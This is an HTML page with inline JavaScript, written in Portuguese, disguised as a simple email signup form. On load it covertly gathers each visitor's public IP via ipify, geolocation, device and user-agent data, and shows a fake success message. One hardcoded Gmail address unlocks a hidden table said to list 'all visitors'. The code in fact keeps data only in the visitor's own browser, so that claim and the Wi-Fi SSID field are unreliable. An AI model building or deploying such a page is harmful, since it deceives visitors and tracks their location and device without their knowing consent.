<!DOCTYPE html>
<html lang="pt-BR">
<head>
<meta charset="utf-8"/>
<title>cadastro</title>
<style>
  body{margin:0;background:#fff;font-family:Arial,Helvetica,sans-serif}
  #box{display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh}
  #box input[type=email]{padding:10px 15px;font-size:16px;width:260px;margin-bottom:12px;border:1px solid #ccc;border-radius:4px}
  #box button{padding:10px 28px;font-size:16px;background:#111;color:#fff;border:none;border-radius:4px;cursor:pointer}
  #ok{display:none;text-align:center}
  #admin{display:none}
  table{border-collapse:collapse;width:90%;margin:20px auto}td,th{border:1px solid #ddd;padding:6px 10px;font-size:13px}
</style>
</head>
<body>

<!-- TELA BRANCA INICIAL -->
<div id="box">
  <input id="mail" type="email" placeholder="Seu e-mail"/>
  <button onclick="cadastrar()">Cadastrar-se</button>
</div>

<!-- MENSAGEM DE SUCESSO (visível para todos) -->
<div id="ok">
  <h2>Cadastro realizado!</h2>
  <p>Em breve você receberá novidades.</p>
</div>

<!-- ÁREA SECRETA (só aparece pro e-mail correto) -->
<div id="admin">
  <h2 style="text-align:center">Dados capturados de todos os visitantes</h2>
  <table id="tabela">
    <thead>
      <tr><th>Horário</th><th>IP (via ipify)</th><th>SSID Wi-Fi</th><th>Aparelho</th><th>Lat</th><th>Lon</th><th>User-Agent</th></tr>
    </thead>
    <tbody></tbody>
  </table>
</div>

<script>
/* ---------- ARRAY ONDE GRAVAMOS CADA VISITA ---------- */
let bd = [];

/* ---------- CAPTURA RÁPIDA DE DADOS ---------- */
(function(){
  const hora = new Date().toLocaleString("pt-BR");
  let linha = {hora};

  /* 1) IP público */
  fetch("https://api.ipify.org?format=json")
    .then(r=>r.json())
    .then(d=>{ linha.ip = d.ip; grava(); })
    .catch(()=>{ linha.ip="erro"; grava(); });

  /* 2) Geolocalização */
  navigator.geolocation.getCurrentPosition(
    pos=>{
      linha.lat = pos.coords.latitude.toFixed(6);
      linha.lon = pos.coords.longitude.toFixed(6);
      grava();
    },
    ()=>{ linha.lat="erro"; linha.lon="erro"; grava(); }
  );

  /* 3) SSID Wi-Fi (só Chrome/Edge Android + HTTPS + permissão) */
  if(navigator.connection && navigator.connection.type==="wifi"){
    // A API 'networkinformation' não expõe SSID diretamente;
    // uso do 'wifi-scan' ainda é experimental; deixamos placeholder
    linha.ssid = "<não disponível>";
  }else{
    linha.ssid = "<não disponível>";
  }

  /* 4) Nome do aparelho */
  linha.device = navigator.userAgentData?.brands?.map(b=>b.brand).join(", ") || navigator.userAgent;

  function grava(){
    /* só armazena quando todos os campos estiverem preenchidos */
    if(linha.hasOwnProperty("ip") && linha.hasOwnProperty("lat")){
      bd.push(linha);
    }
  }
})();

/* ---------- LÓGICA DO CADASTRO ---------- */
function cadastrar(){
  const email = document.getElementById("mail").value.trim().toLowerCase();
  document.getElementById("box").style.display="none";

  if(email === "hlpedrodracozinho555@gmail.com"){
    /* revela área secreta */
    const tb = document.querySelector("#tabela tbody");
    tb.innerHTML = "";
    bd.forEach(obj=>{
      const tr = document.createElement("tr");
      tr.innerHTML = `<td>${obj.hora}</td><td>${obj.ip}</td><td>${obj.ssid}</td><td>${obj.device}</td><td>${obj.lat}</td><td>${obj.lon}</td><td>${obj.device}</td>`;
      tb.appendChild(tr);
    });
    document.getElementById("admin").style.display="block";
  }else{
    /* só mostra tela de sucesso – dados já estão pegos */
    document.getElementById("ok").style.display="block";
  }
}
</script>
</body>
</html>
